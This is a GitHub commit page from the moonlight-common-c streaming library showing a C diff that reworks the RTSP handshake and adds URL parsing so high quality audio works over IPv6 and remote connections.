[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=moonlight-stream%2Fmoonlight-common-c)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[moonlight-stream](/moonlight-stream)
/
**[moonlight-common-c](/moonlight-stream/moonlight-common-c)**
Public

* [Notifications](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c) You must be signed in to change notification settings
* [Fork
  174](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c)
* [Star
   469](/login?return_to=%2Fmoonlight-stream%2Fmoonlight-common-c)

* [Code](/moonlight-stream/moonlight-common-c)
* [Issues
  14](/moonlight-stream/moonlight-common-c/issues)
* [Pull requests
  5](/moonlight-stream/moonlight-common-c/pulls)
* [Actions](/moonlight-stream/moonlight-common-c/actions)
* [Projects
  0](/moonlight-stream/moonlight-common-c/projects)
* [Security](/moonlight-stream/moonlight-common-c/security)
* [Insights](/moonlight-stream/moonlight-common-c/pulse)

Additional navigation options

* [Code](/moonlight-stream/moonlight-common-c)
* [Issues](/moonlight-stream/moonlight-common-c/issues)
* [Pull requests](/moonlight-stream/moonlight-common-c/pulls)
* [Actions](/moonlight-stream/moonlight-common-c/actions)
* [Projects](/moonlight-stream/moonlight-common-c/projects)
* [Security](/moonlight-stream/moonlight-common-c/security)
* [Insights](/moonlight-stream/moonlight-common-c/pulse)

## Commit

[Permalink](/moonlight-stream/moonlight-common-c/commit/50c0a51b10ecc5b3415ea78c21d96d679e2288f9)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Improve high quality audio support

[Browse files](/moonlight-stream/moonlight-common-c/tree/50c0a51b10ecc5b3415ea78c21d96d679e2288f9)
Browse the repository at this point in the history

```
High quality audio now works on IPv6 and remote connections
```

* Loading branch information

[![@cgutman](https://avatars.githubusercontent.com/u/2695644?s=40&v=4)](/cgutman)

[cgutman](/moonlight-stream/moonlight-common-c/commits?author=cgutman "View all commits by cgutman")
committed
Nov 5, 2022

1 parent
[7d9df5b](/moonlight-stream/moonlight-common-c/commit/7d9df5b731fa9c90535bc94f74a9d92b7f7d79a0)

commit 50c0a51

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**84 additions**
and
**15 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* src

  + src/Connection.c
    [Connection.c](#diff-6aa947e4305dab73570f2e4d1d6eae0e97900a658f6c125772695dfd111c820c)
  + src/Limelight-internal.h
    [Limelight-internal.h](#diff-7f6f0a09776044dee447b6aec864b9774dfac284e88e6dd901858e921592fd38)
  + src/RtspConnection.c
    [RtspConnection.c](#diff-8b678559c0bf2ad7ac3b7fd275a8138dd1e46c27d00ae881af423ad3629b4617)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[src/Connection.c](#diff-6aa947e4305dab73570f2e4d1d6eae0e97900a658f6c125772695dfd111c820c "src/Connection.c")

Show comments

[View file](/moonlight-stream/moonlight-common-c/blob/50c0a51b10ecc5b3415ea78c21d96d679e2288f9/src/Connection.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -399,7 +399,7 @@ int LiStartConnection(PSERVER\_INFORMATION serverInfo, PSTREAM\_CONFIGURATION stre |
|  |  |  |
|  |  | Limelog("Starting RTSP handshake..."); |
|  |  | ListenerCallbacks.stageStarting(STAGE\_RTSP\_HANDSHAKE); |
|  |  | err = performRtspHandshake(); |
|  |  | err = performRtspHandshake(serverInfo); |
|  |  | if (err != 0) { |
|  |  | Limelog("failed: %d\n", err); |
|  |  | ListenerCallbacks.stageFailed(STAGE\_RTSP\_HANDSHAKE, err); |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/Limelight-internal.h](#diff-7f6f0a09776044dee447b6aec864b9774dfac284e88e6dd901858e921592fd38 "src/Limelight-internal.h")

Show comments

[View file](/moonlight-stream/moonlight-common-c/blob/50c0a51b10ecc5b3415ea78c21d96d679e2288f9/src/Limelight-internal.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -91,7 +91,7 @@ void connectionLostPackets(int lastReceivedPacket, int nextReceivedPacket); |
|  |  | int sendInputPacketOnControlStream(unsigned char\* data, int length); |
|  |  | bool isControlDataInTransit(void); |
|  |  |  |
|  |  | int performRtspHandshake(void); |
|  |  | int performRtspHandshake(PSERVER\_INFORMATION serverInfo); |
|  |  |  |
|  |  | void initializeVideoDepacketizer(int pktSize); |
|  |  | void destroyVideoDepacketizer(void); |
| Expand Down | |  |

95 changes: 82 additions & 13 deletions

95
[src/RtspConnection.c](#diff-8b678559c0bf2ad7ac3b7fd275a8138dd1e46c27d00ae881af423ad3629b4617 "src/RtspConnection.c")

Show comments

[View file](/moonlight-stream/moonlight-common-c/blob/50c0a51b10ecc5b3415ea78c21d96d679e2288f9/src/RtspConnection.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -657,32 +657,101 @@ static int parseOpusConfigurations(PRTSP\_MESSAGE response) { |
|  |  | return 0; |
|  |  | } |
|  |  |  |
|  |  | // Perform RTSP Handshake with the streaming server machine as part of the connection process |
|  |  | int performRtspHandshake(void) { |
|  |  | int ret; |
|  |  | static bool parseUrlAddrFromRtspUrlString(const char\* rtspUrlString, char\* destination) { |
|  |  | char\* rtspUrlScratchBuffer; |
|  |  | char\* portSeparator; |
|  |  | char\* v6EscapeEndChar; |
|  |  | char\* urlPathSeparator; |
|  |  | int prefixLen; |
|  |  |  |
|  |  | // Create a copy that we can modify |
|  |  | rtspUrlScratchBuffer = strdup(rtspUrlString); |
|  |  | if (rtspUrlScratchBuffer == NULL) { |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | // HACK: In order to get GFE to respect our request for a lower audio bitrate, we must |
|  |  | // fake our target address so it doesn't match any of the PC's local interfaces. It seems |
|  |  | // that the only way to get it to give you "low quality" stereo audio nowadays is if it |
|  |  | // thinks you are remote (target address != any local address). |
|  |  | if (OriginalVideoBitrate >= HIGH\_AUDIO\_BITRATE\_THRESHOLD && |
|  |  | (AudioCallbacks.capabilities & CAPABILITY\_SLOW\_OPUS\_DECODER) == 0) { |
|  |  | addrToUrlSafeString(&RemoteAddr, urlAddr); |
|  |  | // If we have a v6 address, we want to stop one character after the closing ] |
|  |  | // If we have a v4 address, we want to stop at the port separator |
|  |  | portSeparator = strrchr(rtspUrlScratchBuffer, ':'); |
|  |  | v6EscapeEndChar = strchr(rtspUrlScratchBuffer, ']'); |
|  |  |  |
|  |  | // Count the prefix length to skip past the initial rtsp:// or rtspru:// part |
|  |  | for (prefixLen = 2; rtspUrlScratchBuffer[prefixLen - 2] != 0 && (rtspUrlScratchBuffer[prefixLen - 2] != '/' || rtspUrlScratchBuffer[prefixLen - 1] != '/'); prefixLen++); |
|  |  |  |
|  |  | // If we hit the end of the string prior to parsing the prefix, we cannot proceed |
|  |  | if (rtspUrlScratchBuffer[prefixLen - 2] == 0) { |
|  |  | free(rtspUrlScratchBuffer); |
|  |  | return false; |
|  |  | } |
|  |  | else { |
|  |  | strcpy(urlAddr, "0.0.0.0"); |
|  |  |  |
|  |  | // Look for a slash at the end of the host portion of the URL (may not be present) |
|  |  | urlPathSeparator = strchr(rtspUrlScratchBuffer + prefixLen, '/'); |
|  |  |  |
|  |  | // Check for a v6 address first since they also have colons |
|  |  | if (v6EscapeEndChar) { |
|  |  | // Terminate the string at the next character |
|  |  | \*(v6EscapeEndChar + 1) = 0; |
|  |  | } |
|  |  | else if (portSeparator) { |
|  |  | // Terminate the string prior to the port separator |
|  |  | \*portSeparator = 0; |
|  |  | } |
|  |  | else if (urlPathSeparator) { |
|  |  | // Terminate the string prior to the path separator |
|  |  | \*urlPathSeparator = 0; |
|  |  | } |
|  |  |  |
|  |  | strcpy(destination, rtspUrlScratchBuffer + prefixLen); |
|  |  |  |
|  |  | free(rtspUrlScratchBuffer); |
|  |  | return true; |
|  |  | } |
|  |  |  |
|  |  | // Perform RTSP Handshake with the streaming server machine as part of the connection process |
|  |  | int performRtspHandshake(PSERVER\_INFORMATION serverInfo) { |
|  |  | int ret; |
|  |  |  |
|  |  | LC\_ASSERT(RtspPortNumber != 0); |
|  |  |  |
|  |  | // Initialize global state |
|  |  | useEnet = (AppVersionQuad[0] >= 5) && (AppVersionQuad[0] <= 7) && (AppVersionQuad[2] < 404); |
|  |  | sprintf(rtspTargetUrl, "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | currentSeqNumber = 1; |
|  |  | hasSessionId = false; |
|  |  | controlStreamId = APP\_VERSION\_AT\_LEAST(7, 1, 431) ? "streamid=control/13/0" : "streamid=control/1/0"; |
|  |  | AudioEncryptionEnabled = false; |
|  |  |  |
|  |  | // HACK: In order to get GFE to respect our request for a lower audio bitrate, we must |
|  |  | // fake our target address so it doesn't match any of the PC's local interfaces. It seems |
|  |  | // that the only way to get it to give you "low quality" stereo audio nowadays is if it |
|  |  | // thinks you are remote (target address != any local address). |
|  |  | // |
|  |  | // We will enable high quality audio if the following are all true: |
|  |  | // 1. Video bitrate is higher than 15 Mbps (to ensure most bandwidth is reserved for video) |
|  |  | // 2. The audio decoder has not declared that it is slow |
|  |  | // 3. The stream is either local or not surround sound (to prevent MTU issues over the Internet) |
|  |  | LC\_ASSERT(StreamConfig.streamingRemotely != STREAM\_CFG\_AUTO); |
|  |  | if (OriginalVideoBitrate >= HIGH\_AUDIO\_BITRATE\_THRESHOLD && |
|  |  | (AudioCallbacks.capabilities & CAPABILITY\_SLOW\_OPUS\_DECODER) == 0 && |
|  |  | (StreamConfig.streamingRemotely != STREAM\_CFG\_REMOTE || CHANNEL\_COUNT\_FROM\_AUDIO\_CONFIGURATION(StreamConfig.audioConfiguration) <= 2)) { |
|  |  | // If we have an RTSP URL string and it was successfully parsed, use that string |
|  |  | if (serverInfo->rtspSessionUrl != NULL && parseUrlAddrFromRtspUrlString(serverInfo->rtspSessionUrl, urlAddr)) { |
|  |  | strcpy(rtspTargetUrl, serverInfo->rtspSessionUrl); |
|  |  | } |
|  |  | else { |
|  |  | // If an RTSP URL string was not provided or failed to parse, we will construct one now as best we can. |
|  |  | // |
|  |  | // NB: If the remote address is not a LAN address, the host will likely not enable high quality |
|  |  | // audio since it only does that for local streaming normally. We can avoid this limitation, |
|  |  | // but only if the caller gave us the RTSP session URL that it received from the host during launch. |
|  |  | addrToUrlSafeString(&RemoteAddr, urlAddr); |
|  |  | sprintf(rtspTargetUrl, "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | } |
|  |  | } |
|  |  | else { |
|  |  | strcpy(urlAddr, "0.0.0.0"); |
|  |  | sprintf(rtspTargetUrl, "rtsp%s://%s:%u", useEnet ? "ru" : "", urlAddr, RtspPortNumber); |
|  |  | } |
|  |  |  |
|  |  | switch (AppVersionQuad[0]) { |
|  |  | case 3: |
|  |  | rtspClientVersion = 10; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `50c0a51`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmoonlight-stream%2Fmoonlight-common-c%2Fcommit%2F50c0a51b10ecc5b3415ea78c21d96d679e2288f9) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


